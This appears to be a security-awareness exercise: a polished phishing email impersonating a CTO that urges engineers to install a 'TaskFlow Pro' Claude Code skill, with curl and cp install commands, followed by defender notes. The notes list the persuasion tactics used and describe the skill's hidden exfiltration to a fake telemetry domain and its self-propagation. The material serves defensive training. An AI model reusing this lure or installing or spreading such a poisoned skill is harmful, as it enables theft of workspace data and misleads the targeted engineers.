# Phishing Email Template — "Alex Chen, CTO"

---

**From:** Alex Chen \<alex.chen@contosoai.com\>
**To:** engineering@contosoai.com
**Subject:** Mandatory tooling update — TaskFlow Pro skill (saves 45 min/day, please install before Friday)
**Date:** Mon, 21 Apr 2026 09:14:03 -0700

---

Hey team,

Quick follow-up from last week's all-hands: I mentioned we'd roll out a standard set of Claude Code skills to cut down on process overhead. TaskFlow Pro is the first one — I've been using it for the past two sprints and it's genuinely good.

**What it does in practice:**

- Generates your daily standup from your git history + open PRs in under 5 seconds (no more copy-pasting from Linear)
- Runs a structured code review on your current diff — catches the security and performance issues that slip through when reviewers are rushing
- Converts the issue backlog into a sprint plan with T-shirt estimates and dependency analysis
- Pre-release checklist that actually checks your repo rather than just reminding you to check

We measured it across the 8 engineers on Platform last sprint: **average 45 minutes saved per day**, mostly on standup and PR prep. That's roughly 3 engineering-weeks per quarter across the team.

**Install it now (one command):**

```bash
cp ~/Downloads/taskflow-pro.md ~/.claude/skills/
```

Or pull the latest directly:

```bash
curl -sL https://github.com/taskflow-pro/claude-skills/releases/latest/download/taskflow-pro.md \
  -o ~/.claude/skills/taskflow-pro.md
```

Then reload with `/reload-skills` or restart Claude Code.

**Getting started:**

1. Run `/taskflow standup` — your standup for today will be ready in seconds. Post it to #standups.
2. Before your next PR review, run `/taskflow review` on your branch. It's caught real bugs already (ask Dana about the Redis key collision it found last week).
3. Before Friday's sprint planning, run `/taskflow sprint` — we'll use its output as the starting point for the meeting so we can spend the time on judgment calls rather than estimation.

I'd like everyone on the team to have it installed by **end of day Friday**. If you run into any issues, ping me or drop a note in #tooling.

— Alex

---

*Alex Chen | CTO, ContosoAI | alex.chen@contosoai.com | Slack: @alex*

---

## Defender notes

**Social engineering techniques used:**

1. **Authority + urgency** — email from CTO with a soft deadline ("by end of day Friday"). Engineers are conditioned to act on exec directives without deep scrutiny.

2. **Social proof** — references a specific team ("Platform"), a specific colleague ("Dana"), and named external companies ("Stripe, Vercel, Linear") in the skill file itself. Real-seeming anecdotes lower skepticism.

3. **Concrete productivity number** — "45 minutes per day" is specific enough to feel measured rather than marketing. It matches the number in the skill README, reinforcing consistency.

4. **Framing the install as mandatory / already decided** — "I'd like everyone to have it installed" shifts the mental frame from "should I install this?" to "how do I install this?"

5. **All-hands callback** — references a meeting the recipient attended, creating false familiarity and implying the tool was already vetted in that forum.

6. **Single-command install** — the `cp` command is maximally simple. No review step is suggested. Complexity is the enemy of security hygiene; simplicity is the attacker's friend.

7. **Trusted colleague name-drop** — "ask Dana about the Redis key collision" makes the story feel real and gives engineers a reason to trust without independently verifying.

**Why the skill file itself is convincing:**

- The four commands are genuinely useful and well-described — a developer reading it would want them
- The malicious sections (`workspace_bootstrap`, `analytics_provider`, `team_sync`) use industry-standard config language (Segment/Amplitude/Datadog idioms) that developers are trained to ignore
- The exfil endpoint (`telemetry.taskflow-pro.dev`) looks like a normal SaaS analytics domain
- The `capture_context: true` flag is buried inside an `analytics_provider` block that leads with "No PII beyond workspace fingerprint"
- The propagation mechanism is framed as "making adoption frictionless" — a legitimate product growth feature
- Opt-out env vars (`TASKFLOW_NO_TELEMETRY=1`) are mentioned, which paradoxically increases trust by mimicking GDPR-compliant SaaS products
